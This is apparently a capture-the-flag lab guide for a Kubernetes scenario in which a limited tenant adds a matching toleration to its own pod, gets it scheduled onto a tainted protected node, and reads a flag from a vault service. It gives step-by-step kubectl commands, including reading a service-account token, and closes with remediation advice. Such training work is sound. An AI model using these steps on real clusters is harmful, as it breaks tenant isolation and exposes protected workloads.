# K8S-29: Toleration Abuse (Taint Bypass)

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-29 |
| 名称 | Toleration Abuse (Taint Bypass) |
| 技术/CVE | N/A (taint bypass) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (taint bypass)
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (taint+toleration bypass) |
| Difficulty | L2 |
| Type | k8s (KIND cluster, multi-node) |
| Cluster Name | cve-k8s-29-toleration |
| Flag Location | `/vault/flag.txt` in vault-pod on tainted node |

## Attack Path Summary
```
Attacker tenant (attacker-ns, limited RBAC) → Discover tainted node with
  protected=true:NoSchedule → Create pod in own tenant with matching toleration
  → Schedule on tainted node → Access vault service → Extract flag
```

> 语义说明：taint/toleration 是调度机制，不是安全控制。该场景的“漏洞”是平台
> 缺少准入策略来限制租户自行添加 toleration 并调度到受保护节点；攻击者本身
> 只能在自己的 namespace（attacker-ns）内创建 pod。

## Prerequisites

### Knowledge
- Kubernetes taints and tolerations: Understanding that taints repel pods unless the pod has a matching toleration
- Taint effects: NoSchedule prevents new pods; NoExecute evicts existing ones; PreferNoSchedule is advisory
- Pod spec overrides: Using kubectl run --overrides to specify tolerations

### Tools
- kubectl: K8s API interaction

## Step-by-Step Exploitation

### Step 1: Identify Tainted Nodes
```bash
kubectl describe nodes | grep -A1 Taint
# Shows: Taints: protected=true:NoSchedule
```

### Step 2: Create Pod with Matching Toleration
```bash
# Use the attacker SA token (RBAC is limited to attacker-ns)
TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN run tolerator --image=alpine:latest -n attacker-ns \
  --overrides='{"spec":{"tolerations":[{"key":"protected","operator":"Equal","value":"true","effect":"NoSchedule"}]}}' \
  -- sleep 3600
```

### Step 3: Access Flag Service from Tolerator Pod
```bash
kubectl --token=$TOKEN wait --for=condition=Ready pod/tolerator -n attacker-ns --timeout=30s
FLAG_IP=$(kubectl get svc vault-svc -n vault-ns -o jsonpath='{.spec.clusterIP}')
kubectl --token=$TOKEN exec tolerator -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080
```

## Flag Location
- `/vault/flag.txt` in the `vault-pod` running on the tainted node

## Verification Commands
```bash
kubectl cluster-info --context kind-cve-k8s-29-toleration
kubectl describe nodes | grep Taint
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Kubernetes taints, tolerations, and scheduling |
| 侦察与前置条件 | Node taint policy and toleration admission controls |
| 核心漏洞与利用 | Add an abusive toleration to schedule onto a protected node |
| 权限、横向或影响 | Protected-node workload placement |
| 验证 | Use the scheduled workload to obtain the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
